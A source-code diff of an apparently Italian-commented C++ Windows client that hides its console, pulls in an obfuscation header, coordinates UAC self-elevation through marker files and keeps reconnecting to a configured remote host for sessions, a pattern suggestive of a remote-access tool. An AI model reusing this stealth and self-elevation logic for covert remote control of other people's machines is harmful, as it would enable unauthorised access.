@@ -1,16 +1,16 @@
 #include <iostream>
-#include <obfuscate.h>
 #include <EssNet.h>
+#include <obfuscate.h>
 #include <Essentials.h>
-#include <json.hpp>
-#include <opencv2/opencv.hpp>
+#include <EssScreen.h>
+#include <json/json.hpp>
 #include <zlib.h>
 
 using Json = nlohmann::json;
 using namespace cv;
 
-string Version = "2.0.0-b.6";
-int VersioneCompatibile = 4;
+string Version = "2.0.0-b.7";
+int VersioneCompatibile = 5; // b7
 
 using namespace std;
 
@@ -21,7 +21,6 @@ Debugger debug;
 #include "Comunicazioni.hpp"
 #include "Settaggi.hpp"
 #include "Installer.hpp"
-#include "Monitor.hpp"
 #include "Services.hpp"
 #include "Sessione.hpp"
 
@@ -37,13 +36,13 @@ int main()
     EasyMSGB msgb;
     Installer installer;
 
+    short clientErrorCode = 0;
+
     AllocConsole();
     if (!debug.Active)
         cu.HideConsole();
     else
-    {
         freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
-    }
 
     // Per generare la build del Client da distribuire
     if (debug.MakeBuild)
@@ -69,32 +68,68 @@ int main()
             return 0;
         }
 
-        sett.GetSettingsFromReg();
+        sett.GetAllSettings();
     }
 	
     // Verifica che l'auto elevazione sia andata a buon fine
-    if (du.CheckFile(du.GetModuleFilePath() + "Aele"))
+    if (du.CheckFile(du.GetModuleFilePath() + "aele1"))
     {
         if (su.CheckUAC())
         {
-            du.WriteFile(du.GetModuleFilePath() + "AeleOK");
+            // SONO IL CLIENT 1 ADMIN
+            du.WriteFile(du.GetModuleFilePath() + "aeleOK");
         }
         else
         {
-            if (du.CheckFile(du.GetModuleFilePath() + "AeleOK"))
+            if (du.CheckFile(du.GetModuleFilePath() + "aele2"))
             {
-                du.DelFile(du.GetModuleFilePath() + "Aele");
-                du.DelFile(du.GetModuleFilePath() + "AeleOK");
-                du.DelFile(du.GetModuleFilePath() + "AeleSA");
-                return 0;
+                if (du.CheckFile(du.GetModuleFilePath() + "aeleOK"))
+                {
+                    du.DelFile(du.GetModuleFilePath() + "aele1");
+                    du.DelFile(du.GetModuleFilePath() + "aele2");
+                    du.DelFile(du.GetModuleFilePath() + "aele3"); // Client 0 è vivo se il file esiste
+                    du.DelFile(du.GetModuleFilePath() + "aele3"); // Client 0 è vivo se il file esiste
+                    du.DelFile(du.GetModuleFilePath() + "aeleOK");
+                    // SONO IL CLIENT DI EMERGENZA, Client 1 è admin
+                    return 0;
+                }
+                else if (du.CheckFile(du.GetModuleFilePath() + "aele3"))
+                {
+                    du.DelFile(du.GetModuleFilePath() + "aele2");
+                    // SONO IL CLIENT 1 FALLITO, Client 0 potrebbe essere vivo (se aele4 esiste)
+                    return 0;
+                }
+                else
+                {
+                    du.DelFile(du.GetModuleFilePath() + "aele1");
+                    du.DelFile(du.GetModuleFilePath() + "aele2");
+                    // SONO IL CLIENT DI EMERGENZA, Client 0 e 1 sono morti
+                }
             }
-            
-            du.DelFile(du.GetModuleFilePath() + "Aele");
-
-            if (du.CheckFile(du.GetModuleFilePath() + "AeleSA"))
+            else
             {
-                du.DelFile(du.GetModuleFilePath() + "AeleSA");
-                return 0;
+                if (du.CheckFile(du.GetModuleFilePath() + "aele3"))
+                {
+                    if (du.CheckFile(du.GetModuleFilePath() + "aele4"))
+                    {
+                        du.DelFile(du.GetModuleFilePath() + "aele1");
+                        du.DelFile(du.GetModuleFilePath() + "aele3");
+                        du.DelFile(du.GetModuleFilePath() + "aele4");
+                        // SONO IL CLIENT DI EMERGENZA, Client 0 è vivo, Client 1 è morto
+                        return 0;
+                    }
+                    else
+                    {
+                        du.DelFile(du.GetModuleFilePath() + "aele1");
+                        du.DelFile(du.GetModuleFilePath() + "aele3");
+                        // SONO IL CLIENT DI EMERGENZA, Client 0 e 1 sono morti
+                    }
+                }
+                else
+                {
+                    du.DelFile(du.GetModuleFilePath() + "aele1");
+                    // SONO IL CLIENT DI EMERGENZA, Client 0 e 1 sono morti
+                }
             }
         }
     }
@@ -104,42 +139,59 @@ int main()
     Client.Host = sett.Host;
     Client.Port = sett.Porta;
 
-    if (Client.StartClient() != 0)
+    clientErrorCode = Client.StartClient();
+
+    if (!Client.IsOn())
     {
         Client.Stop();
-        _getch();
+        debug.log.Error("Errore durante l'avvio del Client: " + to_string(clientErrorCode));
+
         return 0;
     }
 
-    for (bool i = true; i;)
+    debug.log.Info("Client avviato");
+
+    while (true)
     {
-        while (!Client.Connect()) { Sleep(100); }
-        
-        debug.log.Info("Ricevuta connessione");
-
-        if (COMUNICAZIONI::Inizializzazione(Client.Sock))
+        for (int i = 0; i < 300; i++)
         {
-            debug.log.Info("Connessione accettata");
-
-            Sessione s(Client.Sock);
-
-            switch (s.Start())
+            if (Client.Connect())
             {
-                case 0:
-                    closesocket(Client.Sock);
-                    break;
+                debug.log.Info("Ricevuta connessione");
 
-                case 1:
-                    closesocket(Client.Sock);
-                    Client.Stop();
-                    return 0;
+                if (COMUNICAZIONI::Inizializzazione(Client.Sock))
+                {
+                    debug.log.Info("Connessione accettata " + Client.GetIP());
+
+                    Sessione s(Client.Sock);
+
+                    switch (s.Start())
+                    {
+                        case 0:
+                            closesocket(Client.Sock);
+                            break;
+
+                        case 1:
+                            closesocket(Client.Sock);
+                            Client.Stop();
+                            return 0;
+                            break;
+                    }
+
+                    debug.log.Info("Disconnesso");
                     break;
+                }
             }
-
-            debug.log.Info("Disconnesso");
+            else { Sleep(1000); debug.log.Info("Server OFF"); }
         }
+
         Client.Stop();
-        Client.StartClient();
+
+        while (!Client.IsOn())
+        {
+            debug.log.Info("Esito riavvio Client: " + to_string(Client.StartClient()));
+            Sleep(1000);
+        }
     }
 
     return 0;
